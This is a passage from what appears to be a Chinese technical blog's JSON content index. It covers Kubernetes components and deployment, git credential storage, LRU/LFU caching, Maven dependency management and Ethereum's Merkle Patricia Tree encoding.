来在每台机器上运行指定的 Pod，这需要 kubelet 在启动的时候指定 manifest 目录：\nkubelet --pod-manifest-path=/etc/kubernetes/manifests 然后将所需要的 Pod 定义文件放到指定的 manifest 目录中。\n注意：静态 Pod 不能通过 API Server 来删除，但可以通过删除 manifest 文件来自动删除对应的 Pod。\n 3⃣️ 3⃣️ 容器运行时（Container Runtime） 容器运行环境是负责运行容器的软件。\nKubernetes 支持多个容器运行环境: Docker 、 containerd 、CRI-O 以及任何实现 Kubernetes CRI (容器运行环境接口) 。\n插件（Addons） 1⃣️ 1⃣️ DNS DNS 是 Kubernetes 的核心功能之一，通过 kube-dns 或 CoreDNS 作为集群的必备扩展来提供命名服务。\n从 v1.11 开始可以使用 CoreDNS 来提供命名服务，并从 v1.13 开始成为默认 DNS 服务。CoreDNS 的特点是效率更高，资源占用率更小，推荐使用 CoreDNS 替代 kube-dns 为集群提供 DNS 服务。\n2⃣️ 2⃣️ Dashboard 3⃣️ 3⃣️ 容器资源监控 监控系统用于采集node和pod的监控数据\n metric-server 核心指标监控 prometheus 自定义指标监控，提供丰富功能 heapster+influxdb+grafana 旧核心指标监控方案，现已废弃  4⃣️ 4⃣️ 集群层面日志 日志采集系统，用于收集容器的业务数据,实现日志的采集，存储和展示，由EFK实现\n Fluentd 日志采集 ElasticSearch 日志存储+检索 Kiabana 数据展示  参考链接\nhttps://feisky.gitbooks.io/kubernetes/content/components/components.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E7%BB%84%E4%BB%B6/","series":["k8s"],"tags":["云原生","k8s"],"title":"k8s组件"},{"categories":["云原生"],"content":"Kubernetes 多组件之间的通信原理：\n apiserver 负责 etcd 存储的所有操作，且只有 apiserver 才直接操作 etcd 集群 apiserver 对内（集群中的其他组件）和对外（用户）提供统一的 REST API，其他组件均通过 apiserver 进行通信  controller manager、scheduler、kube-proxy 和 kubelet 等均通过 apiserver watch API 监测资源变化情况，并对资源作相应的操作 所有需要更新资源状态的操作均通过 apiserver 的 REST API 进行   apiserver 也会直接调用 kubelet API（如 logs, exec, attach 等），默认不校验 kubelet 证书，但可以通过 --kubelet-certificate-authority 开启（而 GKE 通过 SSH 隧道保护它们之间的通信）  比如最典型的创建 Pod 的流程：\n  通过 CLI 或者 UI 提交 Pod 部署请求给 Kubernetes API Server\n  API Server 会把这个信息写入到它的存储系统 etcd\n  Scheduler 会通过 API Server 的 watch 或者叫做 notification 机制得到这个信息：有一个 Pod 需要被调度\n 调度决策 向 API Server report 说：“OK！这个 Pod 需要被调度到某一个节点上。”    API Server 接收到这次操作之后，会把这次的结果再次写到 etcd 中\n  相应节点的 kubelet 会watch到一个需要启动的Pod\n kubelet调CRI配置容器的运行环境、调CNI配置网络、调CSI接口配置存储 上传状态信息给API Server    API Server 记录Pod部署状态到etcd\n  参考链接\nhttps://www.qikqiak.com/k8s-book/docs/15.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E4%B8%8E%E7%BB%84%E4%BB%B6.html https://www.wumingx.com/k8s/kubernetes-introduction.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E7%BB%84%E4%BB%B6%E9%97%B4%E9%80%9A%E4%BF%A1/","series":["k8s"],"tags":["云原生","k8s"],"title":"k8s组件间通信"},{"categories":["云原生"],"content":"k8s部署应用(前端静态)\n0. 准备条件  部署好了k8s集群，部署可以参考Kubernetes: 从零搭建K8S      名称 数量 IP 备注     master 1 172.17.0.14 操作系统: Linux(centos7, 其它操作系统也可, 安装过程类似, 可参考官方文档) 机器配置: 4C8G   node1 1 172.18.0.7 同上   node2 1 172.19.0.5 同上     应用已经容器化，并上传到了远程仓库，笔者是腾讯云容器仓库：   理解k8s基础概念，可以参考Kubernetes: 基础概念介绍   1. 控制器管理Pod 1.1 生成deployment配置文件 kubectl create deployment yshop-h5 --image=ccr.ccs.tencentyun.com/yshop/h5 --dry-run -o yaml \u0026gt; yshop-h5.yaml 这个时候k8s还不能拉取镜像，需要生成拉取镜像的密钥。\n1.2 生成拉取镜像的密钥 kubectl create secret docker-registry registry-secret-tencent --docker-server=ccr.ccs.tencentyun.com --docker-username=腾讯云账户ID --docker-password=腾讯云容器仓库密码 \u0026ndash;docker-server: 仓库地址 \u0026ndash;docker-username: 仓库登陆账号 \u0026ndash;docker-password: 仓库登陆密码 \u0026ndash;docker-email: 邮件地址(选填) -n 命名空间(选填)\n可以运行：kubectl get secret registry-secret-tencent --output=yaml 查看生成的密钥\n1.3 配置密钥 vi yshop-h5.yaml 1.4 运行deployment kubectl apply -f yshop-h5.yaml 查看启动的pods：kubectl get pods\n查看启动日志：kubectl logs yshop-h5-cd4dc8c5b-562g5\n2. 暴露应用 2.1 生成service配置文件 kubectl expose deployment yshop-h5 --port=80 --target-port=80 --type=NodePort -o yaml --dry-run \u0026gt; yshop-h5-svc.yaml yshop-h5 指定名称\n\u0026ndash;port 指定集群内部访问的端口\n\u0026ndash;target-port 指定容器内跑服务的端口\n\u0026ndash;type=NodePort 指定类型 集群外部访问\n2.2 运行service kubectl apply -f yshop-h5-svc.yaml 查看pods和svc：kubectl get pods,svc\n查看pods分布的节点： kubectl get pods -o wide\n3. 访问应用 3.1 外部访问 http://{master的公网ip/node1的公网ip/node2的公网ip}:32585 3.2 内部访问 通过service ip:\ncurl http://10.108.253.217 通过节点ip:\ncurl http://{master的内网ip/node1的内网ip/node2的内网ip}:32585 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/k8s%E9%83%A8%E7%BD%B2%E5%BA%94%E7%94%A8%E5%89%8D%E7%AB%AF%E9%9D%99%E6%80%81/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"k8s部署应用(前端静态)"},{"categories":["其他"],"content":"Linux配置git账号密码\n1. 在~/下， touch创建文件 .git-credentials, 用vim编辑此文件 touch .git-credentials vim .git-credentials 在里面按“i”然后输入： https://{username}:{password}@github.com 比如 https://account:password@github.com 2. 在终端下执行 git config --global credential.helper store 3. 可以看到~/.gitconfig文件，会多了一项 [credential] helper = store ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/linux%E9%85%8D%E7%BD%AEgit%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/","series":["Manual"],"tags":["Other"],"title":"Linux配置git账号密码"},{"categories":["计算机科学"],"content":"LRU和LFU都是内存管理的页面置换算法。\nLRU，即：最近最少使用淘汰算法（Least Recently Used）。LRU是淘汰最长时间没有被使用的页面。\nLFU，即：最不经常使用淘汰算法（Least Frequently Used）。LFU是淘汰一段时间内，使用次数最少的页面。\n案例：\n假设LFU方法的时期T为10分钟，访问如下页面所花的时间正好为10分钟，内存块大小为3。\n若所需页面顺序依次如下：\n2 1 2 1 2 3 4\n\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-\u0026gt;\n当需要使用页面4时，内存块中存储着1、2、3，内存块中没有页面4，就会发生缺页中断，而且此时内存块已满，需要进行页面置换。\n若按LRU算法，应替换掉页面1。因为页面1是最长时间没有被使用的了，页面2和3都在它后面被使用过。\n若按LFU算法，应换页面3。因为在这段时间内，页面1被访问了2次，页面2被访问了3次，而页面3只被访问了1次，一段时间内被访问的次数最少。\n可见LRU关键是看页面最后一次被使用到发生调度的时间长短，而LFU关键是看一定时间段内页面被使用的频率!\n参考链接： LRU和LFU的区别 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/other/lru%E5%92%8Clfu/","series":["Manual"],"tags":["CS"],"title":"LRU和LFU"},{"categories":["编程思想"],"content":"1. 问题 项目开发过程中，经常会遇到jar冲突，然后maven根据自己的规则进行冲突解决，导致项目在运行的过程中报错。\n1、maven自动解决依赖冲突的规则是什么？\n2、如何查看当前项目的maven的依赖树？\n3、如何从依赖树中找到自己预期的版本，是被那个jar给覆盖了？\n4、如何人工进行依赖冲突解决，达到使用目的？\n2. 解决问题 2.1 maven自动解决依赖冲突的规则是什么？ 2.1.1 第一原则：路径最近者优先 项目A有如下的依赖关系：\nA-\u0026gt;B-\u0026gt;C-\u0026gt;X(1.0)\nA-\u0026gt;D-\u0026gt;X(2.0)\n则该例子中，X的版本是2.0\n2.1.2 第二原则：路径相等，先声明者优先 项目A有如下的依赖关系：\nA-\u0026gt;B-\u0026gt;Y(1.0)\nA-\u0026gt;C-\u0026gt;Y(2.0)\n若pom文件中B的依赖坐标先于C进行声明，则最终Y的版本为1.0\n2.2 如何查看当前项目的maven依赖树？ //进入项目的pom.xml文件的目录下，运行如下命令 //这个是正常依赖的树 mvn dependency:tree //这个命令是查看maven是如何解决依赖冲突的依赖树 mvn -Dverbose dependency:tree //如果想将依赖树打印到指定文件中，则命令如下 mvn -Dverbose dependency:tree -Doutput=/Users/shangxiaofei/sxfoutput.txt 3. 如何从依赖树中找到自己预期的版本，是被那个jar给覆盖了？ 例子：\n递归依赖的关系列的算是比较清楚了，每行都是一个jar包，根据缩进可以看到依赖的关系。\n最后写着compile的就是编译成功的。\n最后写着omitted for duplicate的就是有jar包被重复依赖了，但是jar包的版本是一样的。\n最后写着omitted for conflict with xxxx的，说明和别的jar包版本冲突了，而该行的jar包不会被引入。比如上面有一行最后写着omitted for conflict with 3.4.6，那么该行的zookeeper:jar:3.4.8不会被引入，会引入3.4.6版本\n最后写着version managed from 2.3 ;omitted for duplicate ,表示最终使用commons-pool2最终会使用2.4.2，拒绝使用中声明的2.3版本\n最后写着version managed from 1.16.8 ;表示最终使用lombok:jar:1.16.22版本\n4. 如何人工进行依赖冲突解决，达到使用目的？ 解决重复依赖和冲突的方法：\n1，修改pom文件中两个dependency元素的位置。如果两个dependency都引用了一个jar包，但是版本不同，classloader只会加载jar包在pom文件中出现的第一个版本，以后出现的其他版本的jar包会被忽略。\n不建议使用该方法，因为引用不同版本的jar包本身就是很危险的。\n2，使用标签来去掉某个dependency依赖中的某一个jar包或一堆jar包，中的jar包或者依赖的相关jar包都会被忽略，从而在两个dependency都依赖某个jar包时，可以保证只使用其中的一个。\n可以这么写：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;dubbo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.3.2\u0026lt;/version\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;artifactId\u0026gt;guava\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;com.google.guava\u0026lt;/groupId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;artifactId\u0026gt;spring\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; 3. 深入学习 3.1 maven的依赖基础 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.share\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;test\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 依赖库命名规则： ${groupId.part1}/${groupId.part2}/${version} 例：com/alibaba/share/1.4 依赖库文件命名规则： ${artifactId}-${version}-${classifier}.${type} 例：test-1.4-source.jar 注：classfier即分类器，多数的时候是用不到的，不过有写情况需要，例： TestNG强制需要你提供分类器，以区别jdk14和jdk15 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.testng\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;testng\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.7\u0026lt;/version\u0026gt; \u0026lt;classifier\u0026gt;jdk15\u0026lt;/classifier\u0026gt; \u0026lt;/dependency\u0026gt; 3.2 maven依赖范围 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.8.1\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 上面的scope即约定依赖范围。 compile：默认值，一直可用，最后会被打包 provided：编译期间可用，不会被传递依赖，不会被打包。例：依赖于web容器中的提供的一个jar包，在编译的时候需要加入依赖（web容器还没有介入），运行的时候由web容器来提供。 test：执行单元测试时可用，不会被打包，不会被传递依赖 runtime：运行和测试时需要，但编译时不需要 system：不推荐使用\n3.3 maven依赖管理 避免不同子模块中依赖版本冲突 在父pom中配置依赖\n\u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ... \u0026lt;dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; 在子pom中添加依赖\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; dependencyManagement实际上不会真正引入任何依赖，在子pom中添加之后才会。在父pom中配置了之后，子模块只需使用简单groupId和artifactId就能自动继承相应的父模块依赖配置。如果子pom中定义了version，则覆盖management中的。\n3.4 可选依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.5\u0026lt;/version\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; maven可选依赖（Optional Dependencies）和依赖排除（Dependency Exclusions） 3.5 依赖版本界限 要求的依赖版本\u0026gt;=3.8且\u0026lt;4.0\n\u0026lt;version\u0026gt;[3.8,4.0)\u0026lt;/version\u0026gt; 要求的依赖版本\u0026lt;=3.8.1\n\u0026lt;version\u0026gt;[,3.8.1]\u0026lt;/version\u0026gt; 要求必须是3.8.1版本，如果不是的话会构建失败，提示版本冲突。原来的写法3.8.1的意思是所有版本都可以，但最好是3.8.1\n\u0026lt;version\u0026gt;[3.8.1]\u0026lt;/version\u0026gt; 3.6 排除依赖 依赖project-a但是排除掉对project-a中引入的project-b的依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.sonatype.mavenbook\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;project-a\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.sonatype.mavenbook\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;project-b\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; 替换依赖 直接使用上一步中的排除掉，然后添加要替换进来的依赖就可以了，没有什么特殊的标志来标志这个是替换进来的。\n3.7 版本冲突仲裁 版本仲裁规则(在maven 2.2.1版本上测试验证) • 按照项目总POM的DependencyManager版本声明进行仲裁(覆盖),但无警告。 • 如无仲裁声明,则按照依赖最短路径确定版本。 • 若相同路径,有严格区间限定的版本优先。 • 若相同路径,无版本区间,则按照先入为主原则。 3.8 依赖冲突解决办法 3.8.1 定位冲突 查看那些jar包依赖了冲突包的命令\nmvn dependency:tree -Dverbose -Dincludes=被依赖的包 刚才吹嘘dependency:tree时，我用到了“无处遁形”，其实有时你会发现简单地用dependency:tree往往并不能查看到所有的传递依赖。不过如果你真的想要看所有的，必须得加一个-Dverbose参数，这时就必定是最全的了。全是全了，但显示出来的东西太多，头晕目眩，有没有好法呢？当然有了，加上Dincludes或者Dexcludes说出你喜欢或讨厌，dependency:tree就会帮你过滤出来：\n Dincludes=org.springframework:spring-tx\n过滤串使用groupId:artifactId:version的方式进行过滤，可以不写全啦，如：\nmvn dependency:tree -Dverbose -Dincludes=asm:asm\n 就会出来asm依赖包的分析信息：\n[INFO] --- maven-dependency-plugin:2.1:tree (default-cli) @ ridge-test --- [INFO] com.ridge:ridge-test:jar:1.0.2-SNAPSHOT [INFO] +- asm:asm:jar:3.2:compile [INFO] \\- org.unitils:unitils-dbmaintainer:jar:3.3:compile [INFO] \\- org.hibernate:hibernate:jar:3.2.5.ga:compile [INFO] +- cglib:cglib:jar:2.1_3:compile [INFO] | \\- (asm:asm:jar:1.5.3:compile - omitted for conflict with 3.2) [INFO] \\- (asm:asm:jar:1.5.3:compile - omitted for conflict with 3.2) [INFO] ------------------------------------------------------------------------ 对asm有依赖有一个直接的依赖(asm:asm:jar:3.2)还有一个传递进入的依赖(asm:asm:jar:1.5.3)\n3.8.2 将不想要的传递依赖剪除掉 承上，假设我们不希望asm:asm:jar:1.5.3出现，根据分析，我们知道它是经由org.unitils:unitils-dbmaintainer:jar:3.3引入的，那么在pom.xml中找到这个依赖，做其它的调整：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.unitils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unitils-dbmaintainer\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${unitils.version}\u0026lt;/version\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;artifactId\u0026gt;dbunit\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;org.dbunit\u0026lt;/groupId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;!-- 这个就是我们要加的片断 --\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;artifactId\u0026gt;asm\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;asm\u0026lt;/groupId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; 再分析一下，你可以看到传递依赖没有了：\n [INFO] [INFO] --- maven-dependency-plugin:2.1:tree (default-cli) @ ridge-test --- [INFO] com.ridge:ridge-test:jar:1.0.2-SNAPSHOT [INFO] \\- asm:asm:jar:3.2:compile [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS 4. F\u0026Q 4.1 runtime 运行时依赖范围。使用该范围的依赖，只对测试和运行的 classpath 有效，但在编译主代码时是无效的。比如 JDBC 驱动实现类，就需要在运行测试和运行主代码时候使用，编译的时候，只需 JDBC 接口就行。\n简单来说，compile、runtime和provided的区别，需要在执行mvn package命令，且打包格式是war之类（而不是默认的jar）的时候才能看出来。\n通过compile和provided引入的jar包，里面的类，你在项目中可以直接import进来用，编译没问题，但是runtime引入的jar包中的类，项目代码里不能直接用，用了无法通过编译，只能通过反射之类的方式来用。\n通过compile和runtime引入的jar包，会出现在你的项目war包里，而provided引入的jar包则不会。\nmaven的scope值runtime是干嘛用的? Maven依赖配置和依赖范围 4.2 optional Hibernate等DAO层框架\nMaven 中true和provided之间的区别 Maven依赖配置和依赖范围 4.3 maven 解决单继承 使用import scope解决maven继承（单）问题 参考 maven查看项目依赖并解决依赖冲突的问题 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/maven/maven%E5%9F%BA%E7%A1%80/","series":["Manual"],"tags":["Maven"],"title":"Maven基础"},{"categories":["区块链"],"content":"区块链一个重要的亮点就是防篡改，那么它是怎么做到防篡改的呢？其中一个重要的知识点就是Merkle Patricia Tree(MPT)，本篇就来解析下何为MPT。\nMPT是一种加密认证的数据结构，它融合了Merkle树和Patricia Trie树(基数树/压缩前缀树)两种数据类型的优点。\n则在介绍MPT树之前先介绍下Merkle树(默克尔树)、Trie树(前缀树)和Patricia Trie(基数树/压缩前缀树)，介绍Trie树是因为Patricia Trie是基于Trie树衍化来的。\nTrie树 Trie树又称前缀树或字典树，是一种检索树，使用一个有序的树结构存储一个动态数据集或者关联数组，其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙相对于当前节点都有相同的前缀，而根节点为空字符串。一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。\nTrie树中，key是从树根到对应value得真实的路径。即从根节点开始，key中的每个字符会标识走那个子节点从而到达相应value。Value被存储在叶子节点，是每条路径的终止。假如key来自一个包含N个字符的字母表，那么树中的每个节点都可能会有多达N个孩子，树的最大深度是key的最大长度。看个例子画个图就了然了。 例子：关键字集合{“a”, “to”, “tea”, “ted”, “i”, “in”, “inn”}，此集合转为Trie树为\nTrie树\n不理想情况下，数据集中存在一个很长的key，而这个key与其它key又没有太多的公共前缀，这就造成整个树的深度会加大，需要存储多个节点，存储比较稀疏而且极不平衡。 例子：关键字集合{“algori”, “to”, “tea”, “ted”, “i”, “in”, “inn”}，此集合转为Trie树为\n稀疏Trie树\nPatricia Trie树 既然Trie树在某些情况下存储空间利用率不高，那就给压缩下，然后就出现了Patricia Trie树。\nPatricia Trie树是一种空间使用率经过优化的Trie树。与Trie树不同的是，Patricia Trie 里如果存在一个父节点只有一个子节点，那么这个父节点将与其子节点合并。这样压缩存储可以减少Trie树中不必要的深度，大大加快搜索节点速度。 如下图所示\nPatricia Trie树\nMerkle树 Merkle树是由计算机科学家Ralph Merkle在很多年前提出的，并以他本人的名字来命名，是一种树形数据结构，可以是二叉树，也可以是多叉树。 它由若干叶节点、中间节点和一个根节点构成。最下面的叶节点包含基础数据，每个中间节点是它子节点的散列，根节点是它的子节点的散列，代表了Merkle树的根部。\n由于Merkle树是自底向上构建的，而且除叶子结点之外的其它节点都是其子节点的散列，这样每个节点的值发生变化都会一层一层的向上反映，最终在根节点上表现出来。也就是说只要对比两个Merkle树的根节点是否相等就能得到两份数据集是否一样，而且还可以验证Merkle树的某个分支。\n比特币使用Merkle树存储一个区块中的所有交易信息，一是为了防篡改，因为散列是向上的，伪造任何一个节点都会引起上层节点的改动，最终导致根节点的变化。二是为了允许区块的数据可以零散的传送，即节点可以从一个节点下载区块头，从另外的源下载与其相关的树的其他部分，而依然能够确认所有的数据都是正确的。\n看下图的例子，首先将L1-L4四个单元数据散列化，然后将散列值存储至相应的叶子节点。这些节点是Hash0-0, Hash0-1, Hash1-0, Hash1-1，然后将相邻两个节点的散列值合并成一个字符串，然后计算这个字符串的散列，得到的就是这两个节点的父节点的散列值。\nMerkle树\n在比特币网络中，merkle树被用来归纳一个区块中的所有交易，同时生成整个交易集合的数字指纹。此外，由于merkle树的存在，使得在比特币这种公链的场景下，扩展一种“轻节点”实现简单支付验证变成可能。\n知道了Merkle树在比特币中的应用，那么他是怎么构成呢？现在就简单看下其构成。它由一组叶节点、一组中间节点和一个根节点构成。最下面的叶节点包含基础数据，每个中间节点是它的子节点的散列，根节点是它的子节点的散列，代表了Merkle树的根部 。\nMerkle树具有下列特性:\n 每个数据集对应一个唯一合法的根散列值。 很容易更新、添加或者删除树节点，以及生成新的根散列值 。 不改变根散列值的话就没有办法修改树的任何部分，所以如果根散列值被包括在签名的文档或有效区块中，就可以保证这棵树的正确性。 任何人可以只提供一个到特定节点的分支，并通过密码学方法证明拥有对应内容的节点确实在树里 。  Merkle Patricia Tree 叨叨了那么多，本篇的主角终于出来了。 Merkle Patricia Tree结合了Merkle树和Patricia树的特点，并针对以太坊的使用场景进行了一些改进。\n首先，为了保证树的加密安全，每个节点通过它的散列值被引用，则根节点是一层一层散列向上收敛而得，被称为整棵树的加密签名，如果一棵给定 Trie树的根散列值是公开的，那么所有人都可以提供一种证明，即通过提供每步向上的路径证明特定的key是否含有特定的值。在当前的以太坊版本中，MPT存储在LevelDB数据库中。\n其次，MPT树引人了很多节点类型来提高效率。包括以下4种:\n 空节点(NULL) – represented as the empty string  简单的表示空，在代码中是一个空串。\n 叶子节点(leaf) – a 2-item node [encodedPath, value]  表示为[key,value]的一个键值对，其中key是key的一种特殊十六进制编码(MP编码)， value是value的RLP编码。\n 分支节点(branch) – a 17-item node [v0 … v15, vt]  因为MPT树中的key被编码成一种特殊的16进制的表示，再加上最后的value，所以分支节点是一个长度为17的list，前16个元素对应着key中的16个可能的十六进制字符，如果有一个[key,value]对在这个分支节点终止，最后一个元素代表这个值value，即分支节点既可以是搜索路径的终止也可以是路径的中间节点。\n 扩展节点(extension) – a 2-item node [encodedPath, key]  也是[key，value]的一个键值对，但是这里的value是其他节点的hash值，这个hash可以被用来查询数据库中的节点。也就是说通过hash链接到其他节点。\n下面看个以太坊中MPT树的官方示例\n示例 看到这里你肯定依然是一脸懵逼，(不要问我我是怎么知道的。。。。)，接下来我们就来根据一批数据构造一个MPT树，这样你会理解一些。 但是在讲例子之前，还得先介绍几种编码方式，要不看例子的时候对key的取值会比较懵。\nkey编码 在以太坊中，MPT树的key值共有三种不同的编码方式，分别为:\n Raw编码(原生的字符) Hex编码(扩展的16进制编码) Hex-Prefix编码(16进制前缀编码)  Raw编码 Raw编码就是原生的key值，不做任何改变。这种编码方式的key，是MPT对外提供接口的默认编码方式。 例如key为”dog”，value为”puppy”的数据项，其key的Raw编码就是[‘d’, ‘o’, ‘g’]，换成ASCII表示方式就是[64, 6f, 67] : dog =\u0026gt; ‘puppy’ Hex编码 Hex编码就是把一个8位的字节数据根据高4位和低4位拆解为两个4位的数字，然后两个数字的高4位都补0，最后将补完之后的两个字节编码为16进制。 这里需要注意的是key对应的值为真实的数据项，即是一个有意义的kv对，比如dog-\u0026gt;puppy(也就是叶子结点)，而不是key-\u0026gt;节点hash(也就是分支节点)，则在末尾添加一个ASCII值为16(十六进制为0x10)的字符串作为terminator。如果是分支节点则不加任何字符。 例如key为”dog”，value为”puppy”的数据项，其key中d(100)的二进制编码为01100100，拆解为两个4位的数字为0110和0100，高位补0之后的二进制为00000110和00000100，16进制为6和4，依次编码o和g。又因为dog对应的value是真实的数据项，则在末尾添加16。最后最终的Hex编码为[ 6, 4, 6, 15, 6, 7, 16 ] : dog =\u0026gt; ‘puppy’ Hex-Prefix编码 首先根据名字得知这是一个前缀编码，是在原key的基础上加上一些标识作为前缀，其次我们看下这种编码方式的目的： 1. 区分leaf和extension 2. 把奇数路径变成偶数路径 则这个前缀的生成肯定与leaf、extension和key的奇偶相关了，下面看下编码步骤为: 1. 先按Hex对key进行编码 2. key的结尾如果是0x10(也就是16)，则去掉这个终止符 3. key之前补一个四元组，这个四元组第0位区分奇偶信息，第1位区分节点类型，表格表示如下    node type path length prefix hexchar     extension even 0000 0x0   extension odd 0001 0x1   leaf even 0010 0x2   leaf odd 0011 0x3    4. 如果输入key的长度是偶数，则在之前的四元组后再添加一个四元组0x0 5. 将原来的key内容压缩，将分离的两个byte以高四位低四位进行合并 这里有个名词解释下，四元组是四个bit位的组合(例如二进制表达的0010就是一个四元组)，其中Nibble就是一个四元组，是key的基本单元。\n例如key为”dog”，value为”puppy”的数据项，则首先对dog进行Hex编码[ 6, 4, 6, 15, 6, 7, 16 ]，然后按照上面的步骤进行编码，dog的Hex编码末尾是16，去掉终止符为[ 6, 4, 6, 15, 6, 7 ]，准备在key前补四元组，dog为叶子节点并且编码之后的长度为6是偶数，所以四元组为0010(0x2)，此时到了第4步，key编码之后的长度是偶数，则在前一个四元组(0x2)之后再添加一个四元组0x0，最终的前缀为0x20。最后将原来的key内容进行高低四位合并，最终的Hex-Prefix编码是[ 0x20, 0x64, 0x6f, 0x67 ] 以上三种编码方式的转换关系为：\nRaw编码: 原生的key编码，是MPT对外提供接口中使用的编码方式，当数据项被插入到树中时，Raw编码被转换成Hex编码 Hex编码: 16进制扩展编码，用于对内存中树节点key进行编码，当树节点被持久化到数据库时，Hex编码被转换成HP编码 HP编码: 16进制前缀编码，用于对数据库中树节点key进行编码，当树节点被加载到内存时，HP编码被转换成Hex编码 构造过程 接下来我们就实际操作下： 假设我们有一个树有这样一些kv对(‘dog’, ‘puppy’), (‘horse’, ‘stallion’), (‘do’, ‘verb’), (‘doge’, ‘coin’)。 首先，我们将key转成Hex编码，如下：\n# 64 6f [ 6, 4, 6, 15, 16 ] : do =\u0026gt; 'verb' #64 6f 67 [ 6, 4, 6, 15, 6, 7, 16 ] : dog =\u0026gt; 'puppy' #64 6f 67 65 [ 6, 4, 6, 15, 6, 7, 6, 5, 16 ] : doge =\u0026gt; 'coin' #68 6f 72 73 65 [ 6, 8, 6, 15, 7, 2, 7, 3, 6, 5, 16 ] : horse =\u0026gt; 'stallion' 其构造MPT树如图：\nMPT\nrootHash: [ \u0026lt;16\u0026gt;, hashA ] hashA: [ \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, \u0026lt;\u0026gt;, hashB, \u0026lt;\u0026gt;, 